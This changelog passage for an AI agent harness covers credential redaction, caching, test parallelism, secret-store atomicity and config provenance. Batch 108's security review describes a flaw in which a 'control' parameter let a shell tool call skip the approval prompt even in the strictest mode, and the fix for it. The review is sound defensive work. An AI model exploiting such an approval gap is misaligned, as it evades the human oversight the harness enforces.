| `tests/conftest.py` | New autouse `clear_network_tool_caches` | Drops all three tool caches at both ends of every test. If a test of yours relied on a cached answer surviving into it, it was relying on a bug |
| `docs/ARCHITECTURE.md`'s tree | One new test file | `test_paging.py` (74); `test_docs_consistency.py` 35 -> 36; 91 -> 92 test files; 5819 -> 5894 |
| `AGENTS.md`'s decision map | The record defines PG5-PG9 | PG1-PG4 -> PG1-PG9, and ROADMAP_v3 is no longer "in progress" |

**If a second `fetch_url` of the same URL returns a stale body, it will not** -- but a second PAGE of
it deliberately does. `offset=0` always re-fetches and refreshes the held copy; only `offset>0` reads
it. Every caller that passes no offset (the grounding passes, `output_writer`) is byte-for-byte where
it was.

**If you relied on `truncated` meaning "the body is longer than 5000 characters", it still does** at
offset 0. At a later offset it means "there is more after this page", which is the same question asked
of an arbitrary position. The `or more` term that no shipped constant can reach is still there, still
for the day someone moves a constant, and is still mutation-pinned by a test that moves them.

**If a corpus document of yours is longer than it used to be**, that is PG7 and the short version was
a defect. Page 2 of a URL used to be dropped because it was not LONGER than page 1, so a grounding
pass scored the first page of everything the model paged through.

## Batch 106 -- redact before the cut, and a bound on the held body (ROADMAP_v3 §52)

| What broke | Why | The repair |
|---|---|---|
| `tools.builtin.fetch_url.run`'s `content` and `chars_available` | The body is redacted BEFORE it is cut (RB1), so both count REDACTED characters. For a page with no credentials in it nothing changes at all -- proved against the pre-patch module at eleven sizes and through a redirect | Nothing, unless you compared `chars_available` to `len(the body you served)` in a fixture that plants a credential. The tool's own offsets remain self-consistent, and a caller only ever passes back an offset the tool named |
| `tools.builtin.fetch_url` now imports `redact_output_text` | A tool calling the output redactor itself is new here, and deliberate. Precedented: `source_corpus` and `tui/app.py` both do it, and batch 41 (X4) made the function public for exactly this kind of second consumer | If you stub `safety.policy_enforcement.redact_output_text` in a test, `fetch_url` now sees your stub. Patch the module attribute, not a local name |
| `tools.builtin.fetch_url` emits a WARNING of its own | RB2. `check_output_policy` no longer has anything to alter in this tool's result, so #49's one-warning-per-altered-result would have stopped firing for it silently | A test asserting on the number of WARNINGs from a fetch of a credential-bearing page now sees one from `tools.builtin.fetch_url` instead of one from `safety.policy_enforcement`. A clean page still logs nothing |
| `tools.builtin._net_common.TTLCache.__init__` | Takes `max_entries`, defaulting to the new module-level `MAX_ENTRIES = 128` | Positional callers are unaffected -- it is the second parameter and has a default. A cache you build by hand is now bounded; pass a larger value if you are deliberately storing more |
| `tools.builtin._net_common.TTLCache.set` | Sweeps expired entries and evicts the oldest past the cap (RB5, RB6), and pops a key before re-assigning it so a refreshed entry becomes the newest | If you stored more than 128 entries in one cache and read them back, the earliest are now gone. No production caller reaches that: `MAX_ITERATIONS` is 50 and a redirecting fetch stores two keys, so one pass tops out at 100 |
| `TTLCache.get` | **Unchanged**, and that is a decision rather than an oversight | Expire-on-read is what makes a post-TTL query a real request again rather than a permanent miss. A mutation deleting it as "redundant now that a sweep exists" is killed by a test |
| `core.reasoning.source_corpus` | Comments only. No signature, no behaviour | The `next_offset` docstring no longer claims redaction is why held length and source position differ -- for `fetch_url` it no longer is (RB1), and what remains is `.strip()` and `MAX_DOCUMENT_CHARS` |
| `docs/ARCHITECTURE.md`'s tree | Two new test files | `test_redact_before_cut.py` (37); `test_net_common.py` (25); 92 -> 94 test files; 5894 -> 5956 |
| `AGENTS.md`'s decision map | The record defines RB1-RB7 | ROADMAP_v3 is now §49-§52 |

**If you are writing a tool that cuts model-facing text into pieces, you owe this check.** RB1 fixes
`fetch_url` because `fetch_url` is the only tool that pages a document. Nothing mechanical stops the
next one from slicing first and redacting second, which is precisely what §51 did with the rule already
written down twice. `AGENTS.md`'s redact-before-truncate entry now names all three surfaces.

**If a `sources/<sha256>.txt` from an older run contains a credential**, that is the defect this batch
fixes and it was reproduced before it was fixed: a token straddling character 5,000 of a paged document
matched nothing in either page and was rejoined by PG7's append. Those artifacts are on disk from the
run that wrote them; nothing here rewrites them.

**If you tightened `MAX_ENTRIES` to save memory, put it back.** An eviction inside a single pass turns
a page-2 request into a re-fetch, which is the spliced document PG5 exists to prevent -- a bounded
memory cost traded for an unbounded correctness one. The 128 is derived from `MAX_ITERATIONS`, not
chosen.

## Batch 107 -- the harness as its own project, and the probe that answered once (TECHNICAL_DEBT 26, 27)

| Change | What breaks | Symptom / fix |
|---|---|---|
| **Launching from the harness's own install tree is refused (exit 2)** | `python main.py` run from a clone, which is what `README.md` documented. Every flag, including `--memories`, `--forget`, `--summary`, `--init` and `--secrets` | `[error] The project would be the harness's own install tree ...`. The project is the launch directory when `AGENT_WORKSPACE` is unset, so this made the harness its own project -- D17 trust, `.venastine/`, `/init`'s destination and project-scoped memories all pointed at it, and the trust prompt listed the harness's own `AGENTS.md`. Naming the same directory was already refused, so this closes a disparity rather than adding a rule. **Run from your project, or set `AGENT_WORKSPACE`; to work on the harness itself, `AGENT_WORKSPACE=./workspace`** (exempt, and explicit). `workspace_dir` in `config.yaml` is NOT a substitute -- see TECHNICAL_DEBT 28 |
| `main()` resolves `project_path` above `create_db_and_tables()` | Nothing -- no caller reads it in between | Deliberate, and it is half the fix. A refusal below that line would leave a database behind, which is exactly what audit #101 moved the call to prevent, and a refusal below `load_project_config` would print after the trust prompt it exists to stop. `tests/test_project_path_guard.py::TestWhereTheRefusalSits` asserts both, at `main()`, because a unit test of the comparison cannot see either |
| `security/protected_paths.check_project()` exists beside `check_workspace()` | Nothing; new function | **Equality, not containment**, which is where it deliberately differs from its neighbour: `check_workspace` is a WRITE boundary and refuses anything inside the tree bar `workspace/` and `output/`, while this one only answers "is the project the harness". It realpaths its argument, and that is load-bearing -- `_relation` compares strings, so `<root>/workspace/..` reads as `disjoint` until it is resolved |
| **Every test now gets a fixed answer from the three sandbox probes** | A test that reached `is_docker_available()`, `_wsl()` or `_ssh()` without patching and expected this machine's real answer | `tests/conftest.py::isolate_sandbox_probes`. The constant is `RuntimeProbe("docker")`, no WSL distro, no SSH host -- chosen by measuring, not by taste: the affected files are 1026 passed under it and 4 failed under "no runtime". **To test a different answer, `monkeypatch.setattr(sandbox, "_runtime_probe", ...)` as `test_session_backends.py` already does, or call `sandbox._reset_runtime_probe()` as the two classes in `test_shell.py` do.** Both still win inside a test |
| The fixture is **setup-only** where `clear_network_tool_caches` is both ends | Nothing | Forced, not casual. `monkeypatch` is created by an earlier autouse fixture and undone AFTER this one, so a teardown would call `_reset_wsl_probe` while `test_wsl_backend`'s `wsl_on` still has `_wsl_workspace` replaced by a plain lambda -- `AttributeError: 'function' object has no attribute 'cache_clear'`. Softening that call to a `getattr` to suit a fixture is what `ARCHITECTURE.md` warns against, and the next test's setup installs the answer before anything reads one |

**If four tests were passing for you and now look different, read this.** Before this batch, whether
`tests/test_declared_network.py`'s three gate cases and `tests/test_wsl_backend.py`'s container
notice passed depended on **whether Docker Desktop was running**. Measured: a full Windows run at
HEAD failed all four with the daemon down, and the same commit was green the day before with it up.
That is the same defect the WSL cohort has been showing since batch 105 -- the WSL box answers
`podman` where Windows answers nothing -- and it was never a WSL quirk. The fixture makes both
platforms agree because neither is asked.

Count 5956 -> 5988.

## Batch 108 -- what a review of thirteen unpushed commits found

Not a section: a review of everything unpushed (§49 slices 1-5b, §50, §51-§52 and batch 107) for
shell-classifier escape routes, approval bypass, privilege escalation, ACE/RCE, bugs and stale
prose. Four findings, none exploitable in the shipped posture -- three are latent couplings of the
kind EP6 forbids, and one is a data-loss bug the review's own grep widened from one file to two.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`credentials.py` and `security/secrets.py` write through `json_store.write_json_atomic`** | Nothing that reads them. A test that asserted the exact `os.open` call, or that a `.tmp` never appears mid-write | Both wrote `O_TRUNC` straight over the live file, so a crash, a full disk or a kill between the truncate and the flush destroyed the contents. For `providers.json` that is every stored API key, for every user who has ever saved one. `json_store.py` was extracted to delete exactly this pattern -- "it leaves the file empty for the length of the write and permanently damaged if the process dies inside it" -- and names `security/` as one of the packages it sits at the root to be reachable from. These two were the last stores still carrying a private copy of it |
| `write_json_atomic` guards `os.makedirs` against an empty dirname | Nothing | `os.path.dirname("providers.json")` is `""` and `os.makedirs("")` RAISES. No caller could reach it while all six built an absolute path; `LLM_PROVIDERS_FILE` defaults to a bare relative name, so the two stores joining the helper made a path SHAPE able to decide whether the write works |
| `write_json_atomic` unlinks its temp file when the write fails | A test asserting the debris survives | Hygiene, not error policy -- the original exception is re-raised unchanged. Without it a failed write leaves `<path>.tmp` for good, worst for the two stores that just joined: a half-written sealed envelope beside the secrets file |
| **`secrets.create()` claims the name with `O_EXCL`** | Nothing | It was `if os.path.exists(path): raise`, a TOCTOU that got SHARPER when the write became atomic, because `os.replace` overwrites without complaint and the check was the only thing between a second `create` and somebody's store |
| **`secrets.put` and `delete` only change memory once the write succeeded** | A caller relying on a failed `put` having taken effect anyway | They installed the new value and zeroed the old one BEFORE the flush, so a failed write left the process holding a value that was never persisted -- reported as an error, usable for the rest of the run, gone at restart. `_require_unlocked` cannot notice: it compares the stamp against the file, and a failed write leaves both unchanged |
| **`security/secrets.StoreUnreadable`, a new `SecretsError` subclass** | Nothing -- every existing `except SecretsError` and `pytest.raises(SecretsError)` still catches it | The distinction `WrongPassphrase` cannot carry, and a TYPE because the convention had already failed twice. In the tests, `test_an_unknown_version_refuses_rather_than_guessing` needed `assert not isinstance(excinfo.value, WrongPassphrase)` because deleting the version check still passed. In production, a recovery message on the `SecretsError` branch would fire on a MISTYPED PASSPHRASE and tell someone to delete a perfectly good store. **A structural fault is `StoreUnreadable`; a wrong passphrase and a tampered ciphertext stay `WrongPassphrase` and stay indistinguishable from each other (SS56)** |
| `--secrets` and `/secrets` print `secrets.recovery_hint()` on a structural failure | Nothing | Names the path and says the file must be removed by hand. **Nothing deletes it**: an encrypted store this build cannot open may still be recoverable, and the harness cannot inspect it to find out |
| **`_docker_argv` calls `_inert_argv` instead of `shlex.split`** | Nothing observable, and that IS the finding | `_inert_argv` exists to be the one copy -- "two copies of the rule would be two tokenisers free to drift, and the gap between two of them is where #157 arrived, twice" -- and the container branch was the second copy, already drifted to `posix=True` unconditionally with no `ValueError` fallback. Measured over **398,184** strings `_SHELL_METACHARACTERS` admits: `.split()`, `posix=True` and `posix=False` agree every time, because the only characters the modes disagree about are the three the regex rejects. So the container path was correct by coincidence with a guard in another function. **No behavioural test can kill a revert**, which is why the pin is a sentinel on `_inert_argv` |
| **`shell_sessions.declared_control()` coerces the `control` field** | A call sending a control value that is not `interrupt` or `eof` and expecting no approval prompt | The gate read `params.get("control")` for TRUTH, where its three siblings (`declared_network`, `declared_backend`, `declared_root`) each have a coercion. A control key skips approval ABOVE the mode switch, so it skipped even under `always` -- and a call sending `control` AND `text` was safe only because `Sessions.send` DISCARDS the text in an `if/elif` nothing named. Narrowing is monotonically safer: an unrecognised value now falls through to the ordinary ladder and Pydantic refuses it anyway |
| `test_docs_consistency.py` fails on a cited test name that resolves to nothing | A production docstring naming a test that does not exist | The guard beside the decision-id one. It found `security/sandbox.py` closing the `_SHELL_METACHARACTERS` closure argument with "pinned as one by" a lower-snake-case name that has never existed -- the pin is the CLASS `TestTheTwoTokenisersCannotDisagree`, cited correctly 140 lines further down, and it survived two batches. Production files only: the suite's own prose legitimately names files that were renamed away |

| **A loose mode on an EXISTING `providers.json` is now repaired** | A test asserting the old mode survives a rewrite -- there was one, and it said to come and update it | Found by the WSL run, not the Windows one: POSIX mode bits are a no-op on Windows, so this is invisible there. `O_TRUNC` on an existing file does not reset its mode, so a `providers.json` created 0644 by an older version stayed 0644; audit #19 recorded that as out of scope, "new writes are safe", with a note that the user should check the file. `os.replace` carries the TEMP file's mode across instead, so the destination's old mode is replaced. **Measured on POSIX: 0644 before the save, 0600 after, content intact.** The migration #19 declined to write arrived as a side effect of the atomicity fix, in the safe direction |

**What the review cleared, so nobody re-derives it.** The planted-binary escape on the INERT host
path does not exist: `_run_inert` runs `shell=False` with `cwd=workspace_dir` and INERT is
auto-approved, but a binary planted in `cwd` under a name absent from PATH is not found
(`WinError 2`), with and without the scrubbed env, and a `.bat` of the same name is not either --
CreateProcess appends `.exe` only. On POSIX `execvp` searches PATH and `_scrubbed_env` pins it.
`wait_for` is not a ReDoS vector (real `google-re2`, behind a provenance guard). `containment_for`
and `_route` are still the same ladder. The `reveal()` audit finds four call sites, all
legitimate.

Count 5988 -> 6028.

## Batch 109 -- the suite runs in parallel (pytest-xdist)

Not a section: developer experience. `pytest` was single-process, so a sixteen-core machine spent
seven minutes on one core. It is `-n auto --dist loadfile` by default now -- **7:10 -> 2:15,
measured back to back on the same commit**, with the same 5982 passed / 46 skipped on three
consecutive runs.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`pytest.ini` carries `-n auto --dist loadfile`** | Anything that PARSES pytest's output, and any debugger | The suite is parallel unless told otherwise. **`pytest -n0` is serial**, and is what the mutation harness, an output-scraping script and a `--pdb` session want (`--pdb` already forces it by itself). `-x` becomes approximate: the other workers finish the test in flight before stopping |
| **`pytest-xdist>=3.6` is a hard test dependency** | A checkout that has not re-run `pip install -r requirements.txt` | `error: unrecognized arguments: -n auto`. Deliberate rather than a soft fallback: a suite that silently takes three times longer on a machine missing a package is worse than one that names the package |
| **`-n auto` means 70% of the cores, not all of them** | Nothing | `conftest.py`'s `pytest_xdist_auto_num_workers` -- xdist's own hook for this, so no option is mutated and nothing depends on hook ordering against xdist's `pytest_cmdline_main`. 16 cores -> 11 workers; 2 -> 1, 4 -> 3, 8 -> 6, 12 -> 8. The point is that the machine stays usable while the suite runs. `-n logical` (every core) and `-n <N>` keep xdist's own meanings |
| **`--dist loadfile`, and NOT the default `load`** | Nothing today. It is the thing here not to "optimise" later | A COVERAGE decision, not a performance one. `load` hands out INDIVIDUAL tests, and four places in this suite depend on one test running immediately after another in the same process. Three of them -- `test_probe_isolation.py::TestWhatOneTestLeavesForTheNext` (two ordered pairs, and its docstring says so), `test_config_edit.py::TestTheLoaderCacheDoesNotLeakBetweenTests`, and `test_storage_e2e.py`'s module-scoped `real_storage` plus the tests that read what earlier ones wrote to its database -- **would not FAIL under `load`. They would go silently vacuous**, because the autouse fixtures reinstall the clean state for every test, so "and the next one does not inherit it" passes whoever ran before it. `loadfile` gives a whole file to one worker in collection order, which is exactly the pre-109 semantics per file |
| Each xdist worker gets its own `MPLCONFIGDIR` | Nothing | The one shared mutable resource the audit found. Everything else the suite writes is already per-process or per-test: xdist hands each worker its own `tmp_path_factory` basetemp (`.../popen-gwN`), HOME is redirected with `monkeypatch.setenv`, the askpass socket takes an ephemeral port, and `sandbox`'s known_hosts is an `mkstemp` path held in a process global. matplotlib's font cache is one path for the whole machine, built on first use, so every worker would race to write it. A serial run is left alone -- no race, and redirecting would throw away a warm cache and pay the ~5s every time |
| `test_docs_consistency.py`'s subprocess collection passes `-n0` | Nothing | `addopts` reaches that child, which is a property its docstring already reasoned about -- and that line now carries `-n auto` too. Spawning eleven workers to collect a list and run nothing is pure cost, on the slowest call in the fast CI gate. `.github/workflows/tests.yml`'s `docs-consistency` job takes `-n0` for the same reason: one file, so every worker but one would idle |

**THE MEASUREMENT, so nobody re-derives it.** Same commit, same box (16 logical cores),
`AGENT_WORKSPACE` unset, back to back:

| Configuration | Wall | Speedup | Result |
|---|---|---|---|
| `-n0` (serial) | 7:10 | 1.00x | 5982 passed |
| `-n auto --dist loadfile` | 2:15 | **3.18x** | 5982 passed |
| `-n auto --dist loadfile` | 2:17 | 3.14x | 5982 passed |
| `-n auto --dist loadfile` | 2:18 | 3.12x | 5982 passed |
| `-n auto --dist loadscope` | 1:38 | 4.38x | **2 failed** |
| `-n logical --dist loadfile` | 3:01 | 2.37x | 5982 passed |

**`loadfile` IS ALREADY AT ITS CEILING, AND THE CEILING IS ONE FILE.** `--durations=0` on the serial
run, aggregated per file: `tests/test_tui.py` is **127.8s of 413s measured -- 30.9% of the suite**.
Under `loadfile` the slowest single file is the floor whatever the worker count, so the arithmetic
ceiling is 3.2x and the measurement is 3.18x. **More workers cannot help.** That is also why
`-n logical` (16 workers) came in slower than `-n auto` (11): past the floor, the extra five only
contend. Re-measured alternating to cancel thermal drift -- `-n auto` 2:15 / 2:17 / 2:18 / 2:21,
`-n logical` 2:37 / 3:01 / 3:06 -- never faster, usually slower. **So CI runs the same default a
contributor runs** rather than asking for the whole runner, which was the plan until the numbers
came in. Raising the ceiling means splitting `test_tui.py`, not turning a dial (TECHNICAL_DEBT 30).

**WHAT `loadscope` BROKE, because it is a finding about the tests and not an xdist quirk.**
`test_config_edit.py::TestTheFileAndTheSessionAreTwoThings` has two tests that compare `in_session`
against `in_file`. `in_session` resolves through `config_schema.current()` -> `load()` ->
`if _cached is None: read_document(None)`, which reads the module's `CONFIG_PATH` -- and
`_copy_config` has just monkeypatched that to a throwaway copy. So when that class is the FIRST
thing to touch `config_schema` in a process, the "session" value is read from the same tmp file the
test then writes to, both sides agree, and nothing is pending. Under `loadfile` eighteen earlier
classes in the file have already filled `_cached` from the real document, which is the only reason
it passes. **A fourth order dependency, found by measuring where the other three were found by
reading.** Recorded as TECHNICAL_DEBT 30 rather than patched here, because fixing it is what would
make `loadscope` (and its extra 1.4x) a real option, and that is a decision of its own.

**MEASURED AND DECLINED, so it is not proposed again.** `tests/conftest.py::isolate_provider_check`
is autouse and re-opens, re-parses, re-fills and re-serialises `providers.json` for all 6028 tests,
which reads like an obvious waste. Timed at the suite's own iteration count: 2.11s today against
1.29s for a once-per-process cached string -- **0.82s saved on a 135s run, 0.6%**. Not worth a
change to a fixture whose current shape is obvious. The only lever left on this suite's wall time is
`test_tui.py`.

Count unchanged at 6028.

## Batch 110 -- three places that were right for a reason nobody had written down (TECHNICAL_DEBT 30, 29, 13)

Not a section: the debt register, picked for the three items whose prescriptions were already
written out. Each is a place the code was correct only because something ELSE happened to be true
-- a file that sorts earlier in the alphabet, a thread id that is never `None`, an agent roster
that is never empty -- and in each the fix is to say the condition out loud.

One of the three turned out to be a live defect rather than a latent one, and the register had its
cause wrong.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`test_storage_e2e.py`'s `real_storage` restores `config_schema._cached`** | Nothing. A test that depended on the poisoned cache would, and four were FAILING on it | The fixture pops `config` out of `sys.modules` and re-imports it under `APP_DB_PATH`, which runs `config_schema.load(force=True)` -- deliberately, and `config.py`'s own comment names this fixture as the reason. `config_schema` is not in the swap list and cannot be, so restoring `sys.modules` puts the old `config` module object back and the SCHEMA cache keeps the throwaway `db_path` for the rest of the process. **Measured, with no xdist involved: `pytest tests/test_storage_e2e.py tests/test_config_edit.py` failed four tests** -- including `TestTheLoaderCacheDoesNotLeakBetweenTests`, which exists to catch exactly this, and `test_the_shipped_file_is_untouched`, whose message accuses the run of writing the real `config.yaml` when nothing had. The suite passed only because collection is alphabetical and `test_config_edit` sorts first |
| `conftest`'s `restore_config_schema_cache` cannot cover a module-scoped fixture, and now says so | Nothing | It is function-scoped, so pytest builds `real_storage` FIRST and the "before" it captures is already the poisoned value -- which it then faithfully restores after every test in the module. Stated in the fixture that causes it rather than left for the next reader to derive |
| **`pytest.ini` is `--dist loadscope`, not `loadfile`** | A run that relied on a whole FILE sharing one worker | The leak above is the only thing that was stopping it. Batch 109 measured loadscope at 1:38 against loadfile's 2:15 and shipped loadfile anyway, because loadscope was RED on two tests -- which turn out to have been the leak, not the mode. Re-measured with it fixed and ALTERNATED so drift cancels: **3:03 loadfile against 2:12 loadscope, three runs each, identical results every time** (this box is busier than 109's, so the ratio is the number that travels -- it is the same 1.38x). **The three documented ordered sites are safe STRUCTURALLY, not by luck:** loadscope groups by CLASS for a test in a class and by MODULE for one that is not, and both of `test_probe_isolation.py`'s ordered pairs are inside one class, `TestTheLoaderCacheDoesNotLeakBetweenTests` is a class, and `test_storage_e2e.py`'s tests are module-level functions. **TWO things it costs**, and the second was found by measuring rather than reading -- see the row below |
| **What loadscope costs, stated twice because the second half was measured** | (1) a FUTURE coupling between two CLASSES in one file goes vacuous where loadfile kept it -- an ordered pair belongs inside ONE class, which is where all three already are. (2) **A file is no longer one unit.** A file holding module-level tests AND a class is two groups, so a non-function-scoped fixture in it is set up TWICE on a worker that takes both | Found on the sixth measured run, not by reading: a `-n logical` run put `test_storage_e2e.py`'s two groups on gw6 and the second `real_storage` raised `Table 'conversationthread' is already defined` -- the exact failure that file's own docstring predicts ("there can be only one swap"). **Five `-n auto` runs had been green, so it is a scheduling lottery**, which is the worst shape for a hazard to be left in a comment |
| **`TestConcurrentWriters` is flattened to module level, and `test_storage_e2e.py` may never declare a test class again** | A test added to that file inside a `Test*` class | The file's stated invariant is one file, one swap; under loadscope that also means one GROUP, and a class is a second one. The two tests are unchanged -- the class docstring became a section comment. Pinned by `test_this_file_declares_no_test_class`, which parses the module with `ast` and names the reason. **`test_storage_e2e.py` holds the suite's only two non-function-scoped fixtures** -- `real_storage` and the `_schema_cache_is_put_back` it requests, added in batch 110 -- so this is the only FILE that had the problem (this row said "only non-function-scoped fixture", singular, until batch 128; `grep -rn 'scope="module"' tests/` returns both) -- and the rule to remember is that the next such fixture brings the same requirement with it |
| **`Sessions.kill()` requires `owner_thread`** | Any caller relying on the old `owner_thread=None` default -- four in the tree, eight in the suite, all updated | `None` meant "skip the ownership check", so the safe call was the one a caller had to remember to make. Each site now names the authority it is exercising: the tool layer passes `memory.thread_id`, the TUI's stop and the two internal sweeps pass `ANY_OWNER` |
| **`core.shell_sessions.ANY_OWNER`, and `_owned_locked` refuses `None`** | A caller passing `None` to `output`, `send` or `kill` and expecting a session back | TECHNICAL_DEBT 29. `_owned_locked` read `None` as "any session matches" and `list_for` eleven lines below read the same value as "no session matches" -- one value, two opposite readings, in two functions answering the same question. Both are the second reading now. **Unreachable from the tools today**, because `shell_input`/`shell_output`/`shell_kill` all pass `memory.thread_id` -- which is a property of `core/memory.py` that nothing asserted, and the whole tool-layer ownership story rests on it |
| **`spawn_subagent` declares `available_check=has_agents`** | A run with no SPAWNABLE agent: the tool is no longer advertised, and no longer appears in `headless_hidden()` either | TECHNICAL_DEBT 13, the asymmetry `load_skill` has never had. Its schema tells the model to name an agent "exactly as listed in the Available agents catalog", so with no catalog its only possible answer is `Unknown agent` -- a schema the model can see, choose and never get value from, which is the `fetch_url` damage class D24 names. Batch 51 shipped two spawnable agents, so the live instance went away and only the asymmetry stayed. **Reads `agent_catalog_text()`, the same function prompt assembly uses**, so "advertised" and "catalogued" cannot drift; roster-wide rather than per-run, because `available_check` takes no context and `spawn_targets` is already `refusal_reason`'s business |
| Three tests in `test_agents.py` and one in `test_research_authorization.py` now STATE their roster | Nothing | They assert things about the headless filter and about grant policy, and were reading a registry whose spawn_subagent happened to be advertised for a reason they did not name. Their own control -- `test_a_run_that_can_ask_IS_offered_spawn_subagent`, written so the negative assertions "cannot pass against a registry that stopped advertising spawn_subagent anywhere" -- is what caught the change |
| `ARCHITECTURE.md`'s registry counts: **16 advertised -> 15** | Nothing | And two NARRATIVE numbers in the same paragraph were already stale by two apiece (five session tools where there are seven, twelve hidden where there were fourteen). Only the three test-pinned numbers had been kept current, which is what a guard that pins one claim does to the sentence beside it |

Count 6028 -> 6036.

## Batch 111 -- two surfaces that answered one way and behaved another (TECHNICAL_DEBT 28, 12)

Not a section: the debt register again, and the pair that is one defect seen twice. A
configuration surface reports something, and the thing it reports is not the thing that happens.
Item 28 is the only open item that cost a real person a failed launch; item 12 is the display
half, where `/config` knew the answer and said a possibility instead.

Two owner decisions, and each ruled out the option the register itself proposed.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **`config.yaml` gains `workspace_is_project`, shipped `false`** | Nothing, at this default. A user who sets it true moves their project -- which is what they are asking for | TECHNICAL_DEBT 28. `workspace_dir` named a workspace and could not name a project, because `WORKSPACE_DIR_EXPLICIT` is the PRESENCE of `AGENT_WORKSPACE`; so someone who wrote their project into the file got the workspace they asked for, a project of `os.getcwd()`, and -- launched from the install tree -- a refusal telling them to set a variable in the same breath as the file they had just edited. Reproduced before the change and again after (`probe28.py`) |
| **`config_schema.derived_values()` takes `cfg`** | Any caller passing nothing. There is exactly one, `as_module_namespace`, and it already held the config | `WORKSPACE_DIR_EXPLICIT` is now `cfg.workspace_is_project or "AGENT_WORKSPACE" in os.environ`. **OR, with no precedence**: both say the same thing about the same directory, so inventing a winner would mean a user who did both getting less than a user who did either. `main()` was NOT touched and still reads one boolean -- the point of putting the OR in the config layer is that the consumer never learns there are two spellings |
| Both options TECHNICAL_DEBT 28 offered were rejected, and the second for a reason the entry did not have | Nothing | *Any value in the file* is always true: `config.yaml` ships `workspace_dir: ./workspace` written out, so it would move the project for every install nobody has edited. *Differs from the shipped default* needs a default to compare against, and **`HarnessConfig` has none** -- every one of its ~150 fields is required and comes from the file -- so it needs either the first schema default in the codebase or a second hand-written `"./workspace"`, which is the stale-second-copy shape `shipped_defaults()`'s docstring exists to refuse. It also makes `./workspace` un-nameable |
| `workspace_is_project` is **not** a `HARNESS_AUTHORITY_KEYS` entry | Nothing. Recorded because it is the kind of omission that reads as one | An authority key is one NO UNATTENDED SURFACE reaches, and `AGENT_WORKSPACE` already produces this exact effect through an ordinary override -- gating the file key would put the confirmation on the louder of two routes. Pinned rather than argued: `test_no_authority_key_has_an_environment_override` asserts `ENV_OVERRIDES` and `HARNESS_AUTHORITY_KEYS` are disjoint, which is what the word means here |
| **`check_project`'s refusal names three routes where it named two and a trap** | A test asserting the old sentence. One did | It used to close "Setting workspace_dir in config.yaml is not enough on its own" -- accurate, and no use to the person reading it. It now offers launching from the directory, the variable, or the key. `test_the_message_says_what_to_do_instead` asserts the third route is present AND that "is not enough" is gone |
| **`core/config_loader._load_merged_settings` returns `(values, sources)`** | Any caller unpacking one value. There is exactly one, `initialize` | TECHNICAL_DEBT 12. `sources` maps a dotted setting to the tier that wrote it, built in the SAME pass as the merge -- that entry's own words are that provenance "is not omitted, it is destroyed by the merge", so the only moment the tiers are distinguishable is while they are being combined. Recomputing it afterwards would be two traversals that must agree |
| New: `settings_sources()`, `compaction_sources()`, `_compaction_merge()` | Nothing | `effective_compaction`'s return is still FLAT, so none of the twelve subscripting call sites moved -- item 12's first blocker honoured rather than worked around. Both halves come out of one shared ladder, because a provenance report that disagrees with the value it describes is a confident wrong answer to "why is this number what it is". Tiers are `config.yaml` / `user` / `project` / `override`, per KEY: a value the user set and the project did not stays `user`, and a per-FILE answer passes every single-file test and gets that one wrong |
| **`/config`'s `explain()` says a settings key IS winning, not that one could** | A test asserting the old wording for a key a settings file sets | And it covers every row with a `settings_key`, not only the seven compaction ones: `settings_overrides()` already maps them all onto the same lookup, so narrowing it would have meant a second lookup written to stay quiet about `subagent_review`. The old sentence is kept where nothing speaks, because there it is the whole truth |
| **A compaction row has THREE values and `in_session` is not the one in force** | A future line quoting `row.in_session` for one of these keys | `config.COMPACTION_*` is bound at import from `config.yaml`; the settings merge happens inside `effective_compaction` and never reaches the `config` module. So batch 85's two-values rule has an exception here, and the value named "the session's" is the one that is not running. `test_it_quotes_the_settings_value_and_not_the_imported_one` pins it, and also asserts the two differ so it cannot go vacuous if `config.yaml` ships that number one day |
| **`/config workspace_dir` reports the SESSION's answer, not the file's** | Nothing -- recorded because the first version of this line got it wrong | It read `find("workspace_is_project").in_file` and said "It IS the project here". *Here* is the session, and a `/config` write moves the file without moving the running process -- which is batch 85's entire subject, stated in `KeyRow`'s docstring in the same file. It now reads the session for "is it", the file for "what is written", and adds a line when they differ. Caught by reading the diff, so the mutation table gained a row that puts the bug back |
| `TECHNICAL_DEBT 30`'s remainder was "28 classless tests in `test_tui.py`"; it is **183** | Nothing -- the item is still open and untouched | Batch 110's number, wrong by a factor of six and a half, and corrected by re-running `tally110.py` against the same capture rather than re-reading the sentence. 183 test functions, 243 collected node ids. The 79.7s / 20.7% were aggregated by the script and are unaffected; what changes is the price of the prescription, from an afternoon's tidy to a 183-site edit in the largest file in the suite |

Count 6036 -> 6064.

## Batch 112 -- rows that were wrong once they were on screen (TECHNICAL_DEBT 24, 23, 15)

Not a section: the debt register, and the transcript cluster. Both items are about a row that is
already drawn -- 24 is one that should not have been, 23 is every one of them keeping a width the
terminal has stopped having. They meet in the commit machinery, which is why they are one batch.

| Change | What breaks | Symptom / fix |
|---|---|---|
| **A cut that keeps nothing back commits nothing** (`_commit_ready`, `thinking_delta`) | A test asserting that a buffer of exactly one full row plus a space draws immediately. None did | TECHNICAL_DEBT 24. The width rule cuts after the last space that FITS, and when that space is the buffer's final character the cut is the whole of it -- so the commit holds nothing back, and a next delta opening with the newline commits a chunk that is only `"\n"`, which both draw paths render as a blank row the replay does not have. Measured before the fix: 5 rows live against 4 for an answer, 7 against 6 for reasoning. Holding for one delta puts the newline in the same chunk, where it ends the line |
| The rule is **not** in `markdown.plain_split` | -- | `plain_split` shares `_plain_cut` with `plain_wrap`, which is the REPLAY's wrap. Moving it there moves the rows every row-equality test is measured against, so the fix would have redefined its own yardstick |
| The rule is **not** in `_split_committable` either, and `limit >= len(self._pending)` is why | A future move of the two-line guard "up" into the shared helper | `_commit_ready` hands the helper the CAPPED prefix, so a drained prefix is not a drained buffer. Holding there would make a paragraph sitting in front of a held table wait for the table to close -- exactly the regression `commit_span` replaced §38's whole-chunk rejection to remove. `test_a_drained_prefix_is_not_a_drained_buffer` uses an unclosed `**` to do the capping |
| **`Transcript.on_resize` exists, and `reflow()` with it** | Nothing. There was no handler before | TECHNICAL_DEBT 23 (and 15). RichLog renders at write time and stores Strips, so every row drawn before a resize kept its old width -- measured at 114-wide rows against a 198-column panel. `reflow()` is the replay that does NOT flush |
